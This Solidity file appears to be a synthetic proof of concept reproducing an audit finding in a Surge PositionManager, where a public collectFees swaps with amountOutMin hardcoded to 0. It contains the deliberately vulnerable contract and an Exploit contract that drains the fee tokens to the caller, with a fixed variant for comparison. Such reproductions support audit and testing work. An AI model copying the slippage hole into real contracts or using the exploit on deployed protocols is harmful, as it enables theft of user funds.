// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Surge PositionManager — collectFees is public and _swapToVolt hardcodes
    amountOutMin = 0 (Shieldify, December 2024, H-01). SYNTHETIC, cheatcode-free.
    The blamed assignment is verbatim (@> VULN).

    Anyone calls collectFees. The router fills the swap at 1 wei because the
    minimum is 0, and sends the 4 fee tokens to the caller. A minimum equal
    to the input reverts and the 4 stay in the manager. */

contract FeeToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Volt {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract Router {
    function swap(address tokenIn, uint256 amountIn, uint256 amountOutMin, address beneficiary, Volt volt) external {
        require(amountOutMin <= 1, "min");
        require(FeeToken(tokenIn).transferFrom(msg.sender, beneficiary, amountIn), "in");
        volt.mint(msg.sender, 1);
    }
}

contract PositionManager {
    FeeToken public fee;
    Volt public volt;
    Router public router;

    constructor(FeeToken _fee, Volt _volt, Router _router) {
        fee = _fee;
        volt = _volt;
        router = _router;
    }

    function collectFees() external {
        uint256 amount = fee.balanceOf(address(this));
        _swapToVolt(address(fee), amount);
    }

    function collectFixed(uint256 minOut) external {
        uint256 amount = fee.balanceOf(address(this));
        fee.approve(address(router), amount);
        router.swap(address(fee), amount, minOut, msg.sender, volt);
    }

    function _swapToVolt(address tokenIn, uint256 amountIn) internal {
        if (amountIn == 0) return;
        require(tokenIn != address(0), "Invalid token");
        require(tokenIn != address(volt), "Invalid token");
        // There is no slippage control
        // @> VULN: amountOutMin is hardcoded to 0, and collectFees is callable by anyone.
        uint256 amountOutMin = 0;
        fee.approve(address(router), amountIn);
        router.swap(tokenIn, amountIn, amountOutMin, msg.sender, volt);
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 4 ether;

    FeeToken public fee; // nonce 1
    Volt public volt; // nonce 2
    Router public router; // nonce 3
    PositionManager public manager; // nonce 4
    uint256 public stolen;
    uint256 public left;

    constructor() {
        fee = new FeeToken();
        volt = new Volt();
        router = new Router();
        manager = new PositionManager(fee, volt, router);
    }

    function run() external {
        fee.mint(address(manager), AMOUNT);
        manager.collectFees();
        uint256 held = fee.balanceOf(address(this));
        require(fee.transfer(msg.sender, held), "sweep");
        stolen = fee.balanceOf(msg.sender);
        left = fee.balanceOf(address(manager));
        require(stolen == AMOUNT, "caller did not take 4");
        require(left == 0, "fees remain");
        require(volt.balanceOf(address(manager)) == 1, "manager received dust volt");
    }
}
